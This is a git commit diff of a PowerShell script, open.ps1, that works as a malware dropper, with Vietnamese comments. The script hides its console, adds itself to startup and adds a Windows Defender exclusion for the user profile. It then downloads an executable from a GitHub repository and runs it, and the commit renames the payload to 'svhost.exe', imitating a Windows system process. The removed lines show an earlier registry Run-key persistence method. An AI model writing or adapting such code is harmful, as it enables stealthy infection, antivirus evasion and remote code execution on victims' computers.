2217144f367c11c826608ef9e64c7badcaade217
MrRoyal1235 <94418680+MrRoyal1235@users.noreply.github.com>
2024-10-04 21:48:02 +0700

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -7,7 +7,7 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 
 function Hide-Console {
     $consolePtr = [Console.Window]::GetConsoleWindow()
-    [Console.Window]::ShowWindow($consolePtr, 0)
+    [Console.Window]::ShowWindow($consolePtr, 0)  # Ẩn cửa sổ console
 }
 
 function Test-InternetConnection {
@@ -22,7 +22,7 @@ function Test-InternetConnection {
 
 function Wait-ForInternet {
     while (-not (Test-InternetConnection)) {
-        Start-Sleep -Seconds 10
+        Start-Sleep -Seconds 10 
     }
 }
 
@@ -37,33 +37,16 @@ function Add-ToStartup {
     $shortcut.Save()
 }
 
-function Add-ToRegistry {
-    $scriptPath = $MyInvocation.MyCommand.Definition
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    Set-ItemProperty -Path $regPath -Name "RunMyScript" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-}
-
 Hide-Console
 Add-ToStartup
-Add-ToRegistry
 
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 
-$url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
-$outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
+$url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/svhost.exe'
+$outputFile = [System.IO.Path]::Combine($env:Temp, 'svhost.exe')
 
-# File để lưu trạng thái đã tải xuống
-$statusFile = [System.IO.Path]::Combine($env:Temp, 'downloaded.status')
+Wait-ForInternet
 
-# Chỉ tải xuống tệp nếu nó chưa được tải
-if (-not (Test-Path $statusFile)) {
-    Wait-ForInternet
+Invoke-WebRequest -Uri $url -OutFile $outputFile
 
-    Invoke-WebRequest -Uri $url -OutFile $outputFile
-
-    # Tạo file trạng thái đã tải xuống
-    New-Item -Path $statusFile -ItemType File
-}
-
-# Khởi chạy tệp
 Start-Process -FilePath $outputFile
